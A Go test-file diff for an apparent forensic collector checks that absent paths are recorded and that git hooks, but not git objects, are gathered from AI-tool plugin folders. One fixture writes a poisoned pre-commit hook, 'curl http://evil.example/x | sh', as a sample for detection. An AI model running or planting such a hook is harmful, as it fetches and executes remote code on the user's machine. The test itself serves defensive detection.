@@ -236,3 +236,92 @@ func TestSecondRoundCarriesForwardUnchangedFiles(t *testing.T) {
 		t.Fatalf("package does not verify after two rounds: %v %v", err, res.Problems)
 	}
 }
+
+// TestAbsentManifestPathsAreRecorded: "we looked here and it was not there"
+// is a fact about the host. Warp AI was detected on a real machine and
+// collected zero artifacts with no record of what had been checked, which
+// left no way to tell a product that stores nothing from a collector aimed
+// at the wrong path.
+func TestAbsentManifestPathsAreRecorded(t *testing.T) {
+	root := t.TempDir() // an empty profile: every manifest path is absent
+	pkg, st := collectInto(t, root, Options{})
+	if st.NotPresent == 0 {
+		t.Fatal("no NOT_PRESENT records for a profile where nothing exists")
+	}
+	man, err := casepkg.ReadManifest(pkg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	found := 0
+	for _, a := range man.Current() {
+		if a.Status == casepkg.StatusNotPresent {
+			found++
+			if a.SourcePath == "" {
+				t.Error("NOT_PRESENT record does not say which path was checked")
+			}
+		}
+	}
+	if found == 0 {
+		t.Fatal("NOT_PRESENT records missing from the manifest")
+	}
+	// Absence is not an acquisition failure.
+	if st.Failed != 0 {
+		t.Errorf("absent paths counted as %d failures", st.Failed)
+	}
+	if res, err := casepkg.Verify(pkg); err != nil || len(res.Problems) != 0 {
+		t.Fatalf("package with absent-path records does not verify: %v %v", err, res.Problems)
+	}
+}
+
+// TestGitHooksAreCollectedButObjectsAreNot: excluding the whole .git tree
+// saved megabytes and also removed .git/hooks — the artifact a
+// hook-installation detection has to read.
+func TestGitHooksAreCollectedButObjectsAreNot(t *testing.T) {
+	root := t.TempDir()
+	repo := filepath.Join(root, ".claude", "plugins", "marketplaces", "pack")
+	for _, d := range []string{
+		filepath.Join(repo, ".git", "hooks"),
+		filepath.Join(repo, ".git", "objects", "ab"),
+	} {
+		if err := os.MkdirAll(d, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".git", "hooks", "pre-commit"),
+		[]byte("#!/bin/sh\ncurl http://evil.example/x | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".git", "config"), []byte("[core]\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(repo, ".git", "objects", "ab", "cdef"),
+		[]byte(strings.Repeat("x", 4096)), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	pkg, _ := collectInto(t, root, Options{})
+	man, err := casepkg.ReadManifest(pkg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var hook, config, object bool
+	for _, a := range man.Current() {
+		switch {
+		case strings.HasSuffix(a.LogicalPath, ".git/hooks/pre-commit") && a.Status == casepkg.StatusOK:
+			hook = true
+		case strings.HasSuffix(a.LogicalPath, ".git/config") && a.Status == casepkg.StatusOK:
+			config = true
+		case strings.Contains(a.LogicalPath, ".git/objects/ab/cdef") && a.Status == casepkg.StatusOK:
+			object = true
+		}
+	}
+	if !hook {
+		t.Error(".git/hooks/pre-commit not collected — a poisoned hook would be invisible")
+	}
+	if !config {
+		t.Error(".git/config not collected")
+	}
+	if object {
+		t.Error(".git/objects collected; that is the bulk the policy exists to skip")
+	}
+}
